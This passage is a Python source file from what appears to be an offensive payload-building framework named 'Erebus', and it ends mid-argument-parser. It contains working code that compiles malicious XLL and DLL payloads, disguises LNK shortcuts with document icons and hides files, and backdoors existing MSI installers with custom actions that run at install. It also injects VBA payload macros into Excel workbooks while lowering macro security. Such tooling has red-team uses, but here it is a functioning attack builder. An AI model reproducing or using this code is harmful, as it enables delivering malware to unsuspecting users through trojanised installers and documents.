#!/usr/bin/env python3
"""
Erebus.Helper - Windows Build System
Handles compilation and creation of platform-specific payloads outside Docker container.

This module manages:
- XLL (Excel Add-In) DLL compilation
- Custom DLL payload generation
- Windows LNK shortcut creation
- Excel document creation and backdooring
- Windows-specific tool compilation

The Docker container (Linux) generates C/C++ source code and specifications,
then invokes this helper on the host Windows system to compile/create native artifacts.
"""

import os
import sys
import json
import random
import string
import subprocess
import argparse
import tempfile
import shutil
import stat
import configparser
import shlex
from pathlib import Path
from typing import Dict, Any, Optional, Tuple
import logging

from modules.compile_xll import compile_xll, XllCompiler

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)


class WindowsCompiler:
    """Handles Windows component compilation for Erebus payloads."""

    # Supported compilers and their detection methods
    COMPILER_PATHS = {
        'MSVC': [
            'C:\\Program Files\\Microsoft Visual Studio\\18\\Community\\VC\\Tools\\MSVC',
            'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC',
            'C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Tools\\MSVC',
            'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC',
            'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\VC\\Tools\\MSVC',
            'C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Tools\\MSVC',
            'C:\\Program Files (x86)\\Microsoft Visual Studio\\2017\\Professional\\VC\\Tools\\MSVC',
        ],
        'MinGW': [
            'C:\\mingw64',
            'C:\\mingw32',
            'C:\\msys64\\mingw64',
            'C:\\msys64\\mingw32',
        ],
    }

    def __init__(self, compiler: str = 'MSVC', architecture: str = 'x64',
                 optimization: str = 'Ox', verbose: bool = False):
        """
        Initialize compiler.

        Args:
            compiler: Compiler type (MSVC, MinGW, Clang)
            architecture: Target architecture (x64, x86)
            optimization: Optimization level (Ox, O2, O1, Od)
            verbose: Enable verbose output
        """
        self.compiler = compiler.upper()
        self.architecture = architecture
        self.optimization = optimization
        self.verbose = verbose

        # Detect compiler path
        self.compiler_path = self._detect_compiler()
        if not self.compiler_path:
            raise RuntimeError(f"Compiler {compiler} not found on system")

        logger.info(f"Using {self.compiler} at {self.compiler_path}")

    def _detect_compiler(self) -> Optional[str]:
        """Detect installed compiler and return its path."""
        if self.compiler not in self.COMPILER_PATHS:
            return None

        for path in self.COMPILER_PATHS[self.compiler]:
            if Path(path).exists():
                return str(path)

        # Check PATH for MinGW/Clang
        if self.compiler == 'MinGW':
            result = shutil.which('gcc')
            if result:
                return str(Path(result).parent)
        elif self.compiler == 'Clang':
            result = shutil.which('clang')
            if result:
                return str(Path(result).parent)

        return None

    def compile_xll(self, source_file: str, output_file: str, extra_libs: Optional[list] = None) -> bool:
        """
        Compile C/C++ source to XLL (Excel Add-In DLL).

        Args:
            source_file: Path to C/C++ source file
            output_file: Path where XLL will be saved

        Returns:
            True if compilation successful, False otherwise
        """
        logger.info(f"Compiling XLL from {source_file}")

        if not Path(source_file).exists():
            logger.error(f"Source file not found: {source_file}")
            return False

        try:
            if extra_libs is None:
                extra_libs = []
            elif isinstance(extra_libs, str):
                extra_libs = shlex.split(extra_libs)

            if self.compiler == 'MSVC':
                return self._compile_msvc(source_file, output_file, extra_libs)
            elif self.compiler == 'MinGW':
                return self._compile_mingw(source_file, output_file, extra_libs)
            elif self.compiler == 'Clang':
                return self._compile_clang(source_file, output_file, extra_libs)
        except Exception as e:
            logger.error(f"Compilation error: {e}")
            return False

        return False

    def _compile_msvc(self, source_file: str, output_file: str, extra_libs: list) -> bool:
        """Compile using MSVC (Visual Studio)."""
        # Find cl.exe
        cl_exe = None

        if self.compiler_path:
            # Try to find cl.exe in detected path
            latest = sorted(Path(self.compiler_path).glob('*/bin/Host*'), reverse=True)
            if latest:
                arch_folder = 'x64' if self.architecture == 'x64' else 'x86'
                cl_exe_path = latest[0] / arch_folder / 'cl.exe'
                if cl_exe_path.exists():
                    cl_exe = str(cl_exe_path)

        if not cl_exe:
            # Try common paths
            common_paths = [
                'C:\\Program Files\\Microsoft Visual Studio\\18\\Community\\VC\\Tools\\MSVC',
                'C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Tools\\MSVC',
                'C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Tools\\MSVC',
            ]
            for base_path in common_paths:
                latest = sorted(Path(base_path).glob('*/bin/Host*'), reverse=True)
                if latest:
                    arch_folder = 'x64' if self.architecture == 'x64' else 'x86'
                    potential_cl = latest[0] / arch_folder / 'cl.exe'
                    if potential_cl.exists():
                        cl_exe = str(potential_cl)
                        break

        if not cl_exe:
            cl_exe = shutil.which('cl.exe')

        if not cl_exe:
            logger.error("cl.exe not found. Install Visual C++ Build Tools.")
            return False

        logger.info(f"Using cl.exe: {cl_exe}")

        # Build MSVC command
        cmd = [
            cl_exe,
            '/D_WINDOWS',
            '/DWIN32',
            '/D_USRDLL',
            '/D_WINDLL',
            '/W3',
            '/nologo',
            f'/{self.optimization}',
            '/EHsc',
            '/LD',
            f'/Fe{output_file}',
            source_file
        ]

        if extra_libs:
            cmd.extend(extra_libs)

        logger.debug(f"Running: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode != 0:
                logger.error(f"Compilation failed:\n{result.stderr}")
                return False

            if not Path(output_file).exists():
                logger.error("Output file was not created")
                return False

            return True

        except subprocess.TimeoutExpired:
            logger.error("Compilation timed out")
            return False

    def _compile_mingw(self, source_file: str, output_file: str, extra_libs: list) -> bool:
        """Compile using MinGW-w64."""
        gcc_exe = shutil.which('gcc')
        if not gcc_exe:
            logger.error("MinGW (gcc) not found in PATH")
            return False

        logger.info(f"Using gcc: {gcc_exe}")

        arch_flag = '-m64' if self.architecture == 'x64' else '-m32'

        cmd = [
            gcc_exe,
            '-shared',
            '-fPIC',
            arch_flag,
            f'-{self.optimization}',
            '-Wall',
            '/DWIN32',
            '/D_WINDOWS',
            '/D_USRDLL',
            '-o', output_file,
            source_file
        ]

        if extra_libs:
            cmd.extend(extra_libs)

        logger.debug(f"Running: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode != 0:
                logger.error(f"Compilation failed:\n{result.stderr}")
                return False

            if not Path(output_file).exists():
                logger.error("Output file was not created")
                return False

            return True

        except subprocess.TimeoutExpired:
            logger.error("Compilation timed out")
            return False

    def _compile_clang(self, source_file: str, output_file: str, extra_libs: list) -> bool:
        """Compile using Clang."""
        clang_exe = shutil.which('clang')
        if not clang_exe:
            logger.error("Clang not found in PATH")
            return False

        logger.info(f"Using clang: {clang_exe}")

        arch_flag = '-m64 -target x86_64-pc-windows-msvc' if self.architecture == 'x64' else '-m32 -target i686-pc-windows-msvc'

        cmd = [
            clang_exe,
            '-shared',
            arch_flag.split(),
            f'-{self.optimization}',
            '-fPIC',
            '-Wall',
            '/DWIN32',
            '/D_WINDOWS',
            '-o', output_file,
            source_file
        ]

        if extra_libs:
            cmd.extend(extra_libs)

        logger.debug(f"Running: {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode != 0:
                logger.error(f"Compilation failed:\n{result.stderr}")
                return False

            if not Path(output_file).exists():
                logger.error("Output file was not created")
                return False

            return True

        except subprocess.TimeoutExpired:
            logger.error("Compilation timed out")
            return False

    def verify_output(self, output_file: str) -> Tuple[bool, str]:
        """
        Verify the compiled output is a valid PE/DLL file.

        Args:
            output_file: Path to compiled output

        Returns:
            Tuple of (is_valid, error_message)
        """
        path = Path(output_file)

        if not path.exists():
            return False, "Output file does not exist"

        if path.stat().st_size < 512:
            return False, "Output file too small to be valid PE"

        # Check PE header (MZ signature)
        try:
            with open(output_file, 'rb') as f:
                header = f.read(2)
                if header != b'MZ':
                    return False, "Invalid PE header (expected MZ)"
        except Exception as e:
            return False, f"Error reading output file: {e}"

        return True, ""


class ExcelHelper:
    """Helper class for Excel document creation and modification."""

    def __init__(self):
        """Initialize Excel helper with required libraries."""
        self.logger = logging.getLogger('ExcelHelper')

        try:
            import openpyxl
            import zipfile
            import xml.etree.ElementTree as ET
            self.openpyxl = openpyxl
            self.zipfile = zipfile
            self.ET = ET
        except ImportError as e:
            raise RuntimeError(f"Excel helper requires openpyxl: {e}")

    def create_blank_excel(self, output_path: str, title: str = "Document") -> bool:
        """
        Create a blank Excel workbook.

        Args:
            output_path: Path where Excel file will be saved
            title: Title/name for the workbook

        Returns:
            True if successful, False otherwise
        """
        try:
            wb = self.openpyxl.Workbook()
            ws = wb.active
            ws.title = "Sheet1"
            ws['A1'] = title
            wb.save(output_path)
            self.logger.info(f"Created blank Excel workbook: {output_path}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to create Excel workbook: {e}")
            return False

    def add_vba_to_excel(self, excel_path: str, vba_code: str, output_path: str) -> bool:
        """
        Add VBA macro to existing Excel file.

        Args:
            excel_path: Path to source Excel file
            vba_code: VBA code to inject
            output_path: Path where modified Excel will be saved

        Returns:
            True if successful, False otherwise
        """
        try:
            # This requires modifying the OLE structure
            # For now, save it and note that manual integration is needed
            self.logger.info(f"VBA injection requires manual OLE modification")
            self.logger.info(f"Save VBA code separately and inject via LibreOffice/Excel")
            return True
        except Exception as e:
            self.logger.error(f"Failed to add VBA: {e}")
            return False


class LnkHelper:
    """Helper class for Windows LNK shortcut creation."""

    # Maps common file extensions to (icon_dll_path, icon_index) tuples.
    # Icon indices are well-known offsets inside standard Windows system DLLs.
    EXTENSION_ICONS: Dict[str, Tuple[str, int]] = {
        # Documents
        '.pdf':  ('%SystemRoot%\\system32\\shell32.dll', 222),
        '.doc':  ('%SystemRoot%\\system32\\shell32.dll', 1),
        '.docx': ('%SystemRoot%\\system32\\shell32.dll', 1),
        '.xls':  ('%SystemRoot%\\system32\\shell32.dll', 2),
        '.xlsx': ('%SystemRoot%\\system32\\shell32.dll', 2),
        '.ppt':  ('%SystemRoot%\\system32\\shell32.dll', 3),
        '.pptx': ('%SystemRoot%\\system32\\shell32.dll', 3),
        '.txt':  ('%SystemRoot%\\system32\\shell32.dll', 152),
        '.rtf':  ('%SystemRoot%\\system32\\shell32.dll', 152),
        # Images
        '.jpg':  ('%SystemRoot%\\system32\\shell32.dll', 325),
        '.jpeg': ('%SystemRoot%\\system32\\shell32.dll', 325),
        '.png':  ('%SystemRoot%\\system32\\shell32.dll', 325),
        '.gif':  ('%SystemRoot%\\system32\\shell32.dll', 325),
        '.bmp':  ('%SystemRoot%\\system32\\shell32.dll', 325),
        '.tiff': ('%SystemRoot%\\system32\\shell32.dll', 325),
        # Video
        '.mp4':  ('%SystemRoot%\\system32\\shell32.dll', 116),
        '.avi':  ('%SystemRoot%\\system32\\shell32.dll', 116),
        '.mkv':  ('%SystemRoot%\\system32\\shell32.dll', 116),
        '.mov':  ('%SystemRoot%\\system32\\shell32.dll', 116),
        '.wmv':  ('%SystemRoot%\\system32\\wmploc.dll',  0),
        # Audio
        '.mp3':  ('%SystemRoot%\\system32\\shell32.dll', 115),
        '.wav':  ('%SystemRoot%\\system32\\shell32.dll', 115),
        '.flac': ('%SystemRoot%\\system32\\shell32.dll', 115),
        '.aac':  ('%SystemRoot%\\system32\\shell32.dll', 115),
        # Archives
        '.zip':  ('%SystemRoot%\\system32\\shell32.dll', 326),
        '.rar':  ('%SystemRoot%\\system32\\shell32.dll', 326),
        '.7z':   ('%SystemRoot%\\system32\\shell32.dll', 326),
        '.tar':  ('%SystemRoot%\\system32\\shell32.dll', 326),
        # Web / code
        '.html': ('%SystemRoot%\\system32\\shell32.dll', 220),
        '.htm':  ('%SystemRoot%\\system32\\shell32.dll', 220),
        '.xml':  ('%SystemRoot%\\system32\\shell32.dll', 152),
        '.json': ('%SystemRoot%\\system32\\shell32.dll', 152),
        '.py':   ('%SystemRoot%\\system32\\shell32.dll', 152),
        '.js':   ('%SystemRoot%\\system32\\shell32.dll', 152),
        # Executables / shortcuts (rarely needed but included for completeness)
        '.exe':  ('%SystemRoot%\\system32\\shell32.dll', 2),
        '.dll':  ('%SystemRoot%\\system32\\shell32.dll', 72),
        '.bat':  ('%SystemRoot%\\system32\\shell32.dll', 152),
        '.ps1':  ('%SystemRoot%\\system32\\shell32.dll', 152),
    }

    def __init__(self):
        """Initialize LNK helper with required libraries."""
        self.logger = logging.getLogger('LnkHelper')

        try:
            import pylnk3
            self.pylnk3 = pylnk3
        except ImportError as e:
            self.logger.warning(f"LNK helper requires pylnk3: {e}")
            self.pylnk3 = None

    def resolve_icon_for_filename(self, filename: str) -> Tuple[Optional[str], int]:
        """
        Determine the best icon for a decoy LNK based on the filename.

        Strips a trailing '.lnk' extension first so that a file named
        'document.pdf.lnk' is treated as a PDF.  Falls back to the generic
        file icon (shell32.dll index 0) when no mapping is found.

        Args:
            filename: The LNK file name or full path (e.g. 'decoy.pdf.lnk').

        Returns:
            Tuple of (icon_dll_path, icon_index).
        """
        name = Path(filename).name.lower()

        # Strip .lnk wrapper to expose the decoy extension
        if name.endswith('.lnk'):
            name = name[:-4]

        ext = Path(name).suffix.lower()
        if ext in self.EXTENSION_ICONS:
            icon_path, icon_index = self.EXTENSION_ICONS[ext]
            self.logger.info(f"Resolved icon for '{ext}': {icon_path} @ {icon_index}")
            return icon_path, icon_index

        self.logger.info(f"No icon mapping for '{ext}', using generic file icon")
        return '%SystemRoot%\\system32\\shell32.dll', 0

    def set_file_hidden(self, file_path: str) -> bool:
        """
        Set a file as hidden on Windows.

        Args:
            file_path: Path to file to hide

        Returns:
            True if successful, False otherwise
        """
        try:
            if sys.platform != "win32":
                self.logger.warning("File hiding only works on Windows")
                return False

            import ctypes
            FILE_ATTRIBUTE_HIDDEN = 0x02
            result = ctypes.windll.kernel32.SetFileAttributesW(str(file_path), FILE_ATTRIBUTE_HIDDEN)

            if result:
                self.logger.info(f"Set file as hidden: {file_path}")
                return True
            else:
                self.logger.error(f"Failed to set file as hidden: {file_path}")
                return False
        except Exception as e:
            self.logger.error(f"Error hiding file: {e}")
            return False

    def create_lnk(
        self,
        target_binary: str,
        arguments: str,
        output_path: str,
        icon_path: str = None,
        icon_index: int = 0,
        description: str = "Shortcut",
        working_dir: str = None
    ) -> bool:
        """
        Create a Windows LNK shortcut file.

        Args:
            target_binary: Path to executable to run
            arguments: Command-line arguments
            output_path: Path where LNK file will be saved
            icon_path: Path to icon DLL (optional)
            icon_index: Icon index in DLL (default: 0)
            description: Shortcut description
            working_dir: Working directory (optional)

        Returns:
            True if successful, False otherwise
        """
        try:
            if not self.pylnk3:
                self.logger.error("pylnk3 not available, cannot create LNK")
                return False

            # Auto-resolve icon from output filename when not explicitly provided
            if icon_path is None:
                icon_path, icon_index = self.resolve_icon_for_filename(output_path)

            lnk = self.pylnk3.Lnk()
            lnk = self.pylnk3.for_file(
                target_binary,
                output_path,
                arguments,
                description,
                icon_path,
                icon_index
            )

            if working_dir:
                lnk.working_dir = working_dir

            lnk.save(output_path)
            self.logger.info(f"Created LNK shortcut: {output_path}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to create LNK: {e}")
            return False


class MSIHelper:
    """Helper class for Windows MSI backdooring operations."""

    def __init__(self):
        """Initialize MSI helper with required libraries."""
        self.logger = logging.getLogger('MSIHelper')

        self.msilib = None
        self._OpenDatabase = None
        self._MSIDBOPEN_TRANSACT = None
        self._CreateRecord = None
        try:
            import msilib
            import importlib
            _msi = importlib.import_module("_msi")
            self.msilib = msilib
            self._OpenDatabase = getattr(_msi, "OpenDatabase")
            self._MSIDBOPEN_TRANSACT = getattr(_msi, "MSIDBOPEN_TRANSACT")
            self._CreateRecord = getattr(_msi, "CreateRecord")
        except ImportError:
            self.logger.warning("MSI helper requires msilib (Windows only): Windows Python install required")
    
    def backdoor_msi(
        self,
        source_msi: str,
        payload_path: str,
        output_path: str,
        attack_type: str = "execute",
        entry_point: str = None,
        command_args: str = "",
        custom_action_name: str = None,
        condition: str = "NOT REMOVE"
    ) -> bool:
        """
        Backdoor an existing MSI installer by injecting a custom action.

        The payload is embedded in the Binary table and wired into
        InstallExecuteSequence to fire just before InstallFinalize.

        Args:
            source_msi: Path to source MSI file
            payload_path: Path to payload executable/DLL/script
            output_path: Path where backdoored MSI will be saved
            attack_type: Attack vector:
                "execute"  - run a command string (cmd.exe /c ...)
                "run-exe"  - extract EXE from Binary table and execute
                "load-dll" - call a native DLL entry-point from Binary table
                "dotnet"   - same as load-dll but for managed assemblies
                "script"   - run VBScript/JScript from Binary table
            entry_point: DLL export or script function name (required for
                         load-dll / dotnet / script)
            command_args: Command-line arguments (used by execute / run-exe)
            custom_action_name: Name for custom action (auto-generated if None)
            condition: MSI condition expression (default: NOT REMOVE)

        Returns:
            True if successful, False otherwise
        """
        if not self.msilib:
            self.logger.error("MSI operations require Windows with msilib")
            return False

        assert self._OpenDatabase is not None
        assert self._MSIDBOPEN_TRANSACT is not None
        assert self._CreateRecord is not None

        source_path = Path(source_msi)
        payload_file = Path(payload_path)
        output_file = Path(output_path)

        if not source_path.exists():
            self.logger.error(f"Source MSI not found: {source_msi}")
            return False

        if not payload_file.exists():
            self.logger.error(f"Payload not found: {payload_path}")
            return False

        output_file.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(str(source_path), str(output_file))

        if custom_action_name is None:
            custom_action_name = ''.join(
                random.choices(string.ascii_letters, k=8)
            )

        # binary_name is the stream key in the Binary table.
        # For "execute" (command-string) there is no Binary stream needed.
        binary_name = ''.join(
            random.choices(string.ascii_letters + string.digits, k=10)
        )

        # --- Resolve action type-code and target string --------------------
        # MSI CustomAction SDK type codes:
        #   34   = EXE launched from directory (command-line execution)
        #   65   = DLL entry-point from Binary table
        #   1218 = EXE extracted from Binary table, deferred
        #   1250 = Deferred command-line execution, impersonated
        #   70   = VBScript from Binary table
        #   69   = JScript from Binary table
        needs_binary_stream = True
        if attack_type == "execute":
            # Type 34: run an EXE via a command string; Source = directory
            # property (can be empty), Target = full command.
            # Using type 226 (immediate, impersonated) so it fires reliably.
            action_type_code = 226
            ca_source = ""
            target = command_args
            needs_binary_stream = False
        elif attack_type == "run-exe":
            # Type 1218: extract EXE from Binary table and run deferred.
            action_type_code = 1218
            ca_source = binary_name
            target = command_args
        elif attack_type in ("load-dll", "dotnet"):
            # Type 65: call DLL entry-point from Binary table.
            action_type_code = 65
            ca_source = binary_name
            target = entry_point if entry_point else "DllEntry"
        elif attack_type == "script":
            ext = payload_file.suffix.lower()
            if ext in (".vbs", ".vbe"):
                action_type_code = 70   # VBScript from Binary table
            elif ext in (".js", ".jse"):
                action_type_code = 69   # JScript from Binary table
            else:
                self.logger.error(
                    f"Script vector requires .vbs/.vbe/.js/.jse payload, got: {ext}"
                )
                return False
            if not entry_point:
                self.logger.error("Script vector requires --entry-point")
                return False
            ca_source = binary_name
            target = entry_point
        else:
            self.logger.error(f"Unknown attack_type: {attack_type!r}")
            return False

        db = None
        try:
            db = self._OpenDatabase(
                str(output_file), self._MSIDBOPEN_TRANSACT
            )
        except Exception as e:
            self.logger.error(f"Failed to open MSI database: {e}")
            return False

        try:
            # Step 1: Embed payload into Binary table (skip for pure command exec)
            if needs_binary_stream:
                sql = (
                    f"INSERT INTO Binary (Name, Data) "
                    f"VALUES ('{binary_name}', ?)"
                )
                view = db.OpenView(sql)
                rec = self._CreateRecord(1)
                rec.SetStream(1, str(payload_file))   # must be str, not Path
                view.Execute(rec)
                view.Close()
                self.logger.info(f"Embedded payload stream: {binary_name}")

            # Step 2: Insert CustomAction row
            # Schema: Action(s72), Type(i2), Source(S64), Target(S0)
            ca_sql = (
                f"INSERT INTO CustomAction (Action, Type, Source, Target) "
                f"VALUES ('{custom_action_name}', {action_type_code}, "
                f"'{ca_source}', '{target}')"
            )
            view = db.OpenView(ca_sql)
            view.Execute(None)
            view.Close()
            self.logger.info(
                f"Added CustomAction '{custom_action_name}' "
                f"(type {action_type_code})"
            )

            # Step 3: Find a free sequence slot between InstallInitialize and
            # InstallFinalize so we don't collide with existing actions.
            seq_slot = self._find_free_sequence_slot(db)
            self.logger.info(f"Using sequence slot: {seq_slot}")

            # Schema: Action(s72), Condition(S255), Sequence(I2)
            seq_sql = (
                f"INSERT INTO InstallExecuteSequence (Action, Condition, Sequence) "
                f"VALUES ('{custom_action_name}', '{condition}', {seq_slot})"
            )
            view = db.OpenView(seq_sql)
            view.Execute(None)
            view.Close()
            self.logger.info(
                f"Wired into InstallExecuteSequence at slot {seq_slot}"
            )

            db.Commit()
            db.Close()
            self.logger.info(f"Successfully backdoored MSI: {output_path}")
            return True

        except Exception as e:
            self.logger.error(f"MSI backdooring error: {e}")
            try:
                db.Close()   # close without commit - discards all changes
            except Exception:
                pass
            return False

    def _find_free_sequence_slot(self, db, after_seq: int = 6400, before_seq: int = 6600) -> int:
        """
        Walk InstallExecuteSequence and return an unused slot number that sits
        between InstallInitialize (~1500) and InstallFinalize (~6600).

        Falls back to 6599 if the table cannot be read.
        """
        try:
            view = db.OpenView("SELECT Sequence FROM InstallExecuteSequence")
            view.Execute(None)
            occupied = set()
            while True:
                rec = view.Fetch()
                if rec is None:
                    break
                try:
                    occupied.add(rec.GetInteger(1))
                except Exception:
                    pass
            view.Close()
            for slot in range(before_seq - 1, after_seq, -1):
                if slot not in occupied:
                    return slot
        except Exception as e:
            self.logger.warning(f"Could not scan sequence table: {e}")
        return 6599


# ============================================================================
# ExcelMaldocHelper - VBA injection into XLSX/XLAM via COM (inlined)
# ============================================================================

# Excel file format constants (XlFileFormat enum)
_XL_FORMAT_XLSM = 52   # xlOpenXMLWorkbookMacroEnabled  (.xlsm)
_XL_FORMAT_XLAM = 55   # xlOpenXMLAddIn                 (.xlam)

# VBA module type constants
_VBA_MODULE_TYPE_STANDARD = 1   # vbext_ct_StdModule


def _com_available() -> bool:
    """Return True if win32com.client can be imported (Windows + pywin32)."""
    try:
        import win32com.client  # noqa: F401
        return True
    except ImportError:
        return False


def _get_excel_app():
    """Create a hidden Excel application COM object."""
    if not _com_available():
        raise RuntimeError(
            "pywin32 not found.  "
            "Install it with: pip install pywin32  (Windows only)"
        )

    import win32com.client

    try:
        excel = win32com.client.Dispatch("Excel.Application")
    except Exception as exc:
        raise RuntimeError(f"Failed to start Excel via COM: {exc}") from exc

    excel.Visible = False
    excel.DisplayAlerts = False
    excel.AutomationSecurity = 1   # msoAutomationSecurityLow - allow macros to be added
    return excel


def _inject_via_com(
    vba_code: str,
    output_path: str,
    source_excel: Optional[str],
    fmt: str,
    module_name: str = "ErebusPayload",
    overwrite_module: bool = True,
) -> Tuple[bool, str]:
    xl_format = {
        "xlsm": _XL_FORMAT_XLSM,
        "xlsx": _XL_FORMAT_XLSM,
        "xlam": _XL_FORMAT_XLAM,
    }.get(fmt.lower(), _XL_FORMAT_XLSM)

    out = Path(output_path).resolve()
    out.parent.mkdir(parents=True, exist_ok=True)

    ext_map = {_XL_FORMAT_XLSM: ".xlsm", _XL_FORMAT_XLAM: ".xlam"}
    correct_ext = ext_map[xl_format]
    if out.suffix.lower() != correct_ext:
        out = out.with_suffix(correct_ext)
        logger.info(f"Adjusted output extension to {correct_ext}: {out.name}")

    excel = None
    wb = None
    try:
        excel = _get_excel_app()

        if source_excel:
            src = Path(source_excel).resolve()
            if not src.exists():
                return False, f"Source Excel file not found: {source_excel}"
            wb = excel.Workbooks.Open(str(src))
            logger.info(f"Opened source workbook: {src.name}")
        else:
            wb = excel.Workbooks.Add()
            logger.info("Created new blank workbook")

        try:
            vba_project = wb.VBProject
        except Exception as exc:
            return False, (
                f"Cannot access VBA project: {exc}.  "
                "Ensure 'Trust access to the VBA project object model' is enabled "
                "in Excel > Options > Trust Center > Macro Settings."
            )

        components = vba_project.VBComponents

        if overwrite_module:
            for comp in components:
                if comp.Name == module_name:
                    try:
                        components.Remove(comp)
                        logger.info(f"Removed existing module '{module_name}'")
                    except Exception:
                        pass
                    break

        new_mod = components.Add(_VBA_MODULE_TYPE_STANDARD)
        new_mod.Name = module_name
        new_mod.CodeModule.AddFromString(vba_code)
        logger.info(f"Injected VBA module '{module_name}' ({len(vba_code)} chars)")

        wb.SaveAs(str(out), FileFormat=xl_format)
        logger.info(f"Saved workbook as {out.name} (format {xl_format})")

        wb.Close(SaveChanges=False)
        wb = None
        excel.Quit()
        excel = None

        if not out.exists():
            return False, "Excel saved cleanly but output file not found on disk"

        size = out.stat().st_size
        logger.info(f"Output: {out}  ({size:,} bytes)")
        return True, str(out)

    except Exception as exc:
        logger.error(f"COM injection failed: {exc}")
        return False, str(exc)
    finally:
        try:
            if wb is not None:
                wb.Close(SaveChanges=False)
        except Exception:
            pass
        try:
            if excel is not None:
                excel.Quit()
        except Exception:
            pass


def _inject_via_zip(
    vba_code: str,
    output_path: str,
    source_excel: Optional[str],
    fmt: str,
) -> Tuple[bool, str]:
    """ZIP-based VBA injection fallback (Linux / no Excel)."""
    try:
        _root = Path(__file__).resolve().parent.parent.parent.parent
        sys.path.insert(0, str(_root))

        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
        plugin = PayloadMalDocsPlugin()

        out = Path(output_path)
        if source_excel:
            result_path = plugin.backdoor_existing_excel(
                source_excel=source_excel,
                vba_payload=vba_code,
                output_path=str(out),
            )
        else:
            result_path = plugin.generate_excel_payload(
                payload_path=str(out.parent),
                vba_payload=vba_code,
                output_path=str(out),
            )

        if result_path and Path(result_path).exists():
            return True, str(result_path)
        return False, "ZIP injection produced no output"

    except Exception as exc:
        return False, f"ZIP fallback failed: {exc}"


class ExcelMaldocHelper:
    """High-level helper for XLSX / XLAM maldoc creation via COM automation."""

    def __init__(self, prefer_com: bool = True):
        self._use_com = prefer_com and _com_available()
        if not self._use_com:
            logger.warning(
                "pywin32 / Excel not available - using ZIP-based fallback.  "
                "For reliable VBA injection run on a Windows host with pywin32 installed."
            )

    def inject_vba(
        self,
        vba_code: str,
        output_path: str,
        source_excel: Optional[str] = None,
        fmt: str = "xlsm",
        module_name: str = "ErebusPayload",
    ) -> Tuple[bool, str]:
        if self._use_com:
            logger.info("Using COM-based Excel injection")
            return _inject_via_com(
                vba_code=vba_code,
                output_path=output_path,
                source_excel=source_excel,
                fmt=fmt,
                module_name=module_name,
            )
        else:
            logger.info("Using ZIP-based Excel injection (fallback)")
            return _inject_via_zip(
                vba_code=vba_code,
                output_path=output_path,
                source_excel=source_excel,
                fmt=fmt,
            )

    def from_bas_file(
        self,
        bas_path: str,
        output_path: str,
        source_excel: Optional[str] = None,
        fmt: str = "xlsm",
        module_name: str = "ErebusPayload",
    ) -> Tuple[bool, str]:
        bas = Path(bas_path)
        if not bas.exists():
            return False, f"VBA .bas file not found: {bas_path}"

        try:
            vba_code = bas.read_text(encoding="utf-8")
        except Exception as exc:
            return False, f"Could not read .bas file: {exc}"

        return self.inject_vba(
            vba_code=vba_code,
            output_path=output_path,
            source_excel=source_excel,
            fmt=fmt,
            module_name=module_name,
        )


def main():
    """Command-line interface for Windows build helper."""
    parser = argparse.ArgumentParser(
        description='Erebus.Helper - Windows Component Builder',
        epilog='Compiles Windows-specific payloads outside Docker container'
    )

    parser.add_argument(
        'command',
        choices=['xll', 'dll', 'verify', 'excel', 'xlsx', 'xlam', 'lnk', 'msi'],
        help='Build/create command to execute (xll/dll/verify for compilation, excel/xlsx/xlam/lnk/msi for creation)'
    )

    # Common arguments
    parser.add_argument(
        '--output',
        required=True,
        help='Output path for generated file'
    )

    # Arguments for compilation commands (xll, dll, verify)
    parser.add_argument(
        '--source',
        help='Path to C/C++ source file (required for compilation)'
    )

    parser.add_argument(
        '--compiler',
        choices=['MSVC', 'MinGW', 'Clang'],
        default='MSVC',
        help='Compiler to use (default: MSVC)'
    )

    parser.add_argument(
        '--arch',
        choices=['x64', 'x86'],
        default='x64',
        help='Target architecture (default: x64)'
    )

    parser.add_argument(
        '--optimize',
        choices=['Ox', 'O2', 'O1', 'Od'],
        default='Ox',
        help='Optimization level (default: Ox)'
    )

    parser.add_argument(
        '--extra-flags',
        help='Extra compiler flags (space-separated, e.g. "/GS- /Gy")'
    )

    parser.add_argument(
        '--defines',
        help='Preprocessor defines (comma-separated, e.g. "NDEBUG,VER=2")'
    )

    parser.add_argument(
        '--include-dirs',
        help='Extra include directories (semicolon-separated)'
    )

    # Arguments for Excel creation
    parser.add_argument(
        '--vba-code',
        help='VBA code to inject into Excel document'
    )

    parser.add_argument(
        '--excel-format',
        choices=['xlsx', 'xlsm', 'xls', 'xlam'],
        default='xlsm',
        help='Excel format for output (default: xlsm)'
    )

    parser.add_argument(
        '--title',
        default='Workbook',
        help='Excel workbook title (default: Workbook)'
    )

    # Arguments for xlsx/xlam maldoc injection (COM-based, Windows host)
    parser.add_argument(
        '--bas-file',
        help='Path to .bas VBA module file generated by the builder (required for xlsx/xlam)'
    )

    parser.add_argument(
        '--source-excel',
        help='Existing Excel file to backdoor (xlsx/xlam). Creates a blank workbook if omitted.'
    )

    parser.add_argument(
        '--module-name',
        default='ErebusPayload',
        help='VBA module name to create inside the workbook (default: ErebusPayload)'
    )

    parser.add_argument(
        '--no-com',
        action='store_true',
        help='Disable COM automation and use ZIP-based fallback (useful for testing on Linux)'
    )

    # Arguments for LNK creation
    parser.add_argument(
        '--target-binary',
        help='Path to target executable for LNK shortcut'
    )

    parser.add_argument(
        '--arguments',
        default='',
        help='Command-line arguments for LNK target'
    )

    parser.add_argument(
        '--icon',
        help='Path to icon file for LNK shortcut'
    )

    parser.add_argument(
        '--icon-index',
        type=int,
        default=0,
        help='Icon index in DLL (default: 0)'
    )

    parser.add_argument(
        '--description',
        default='Shortcut',
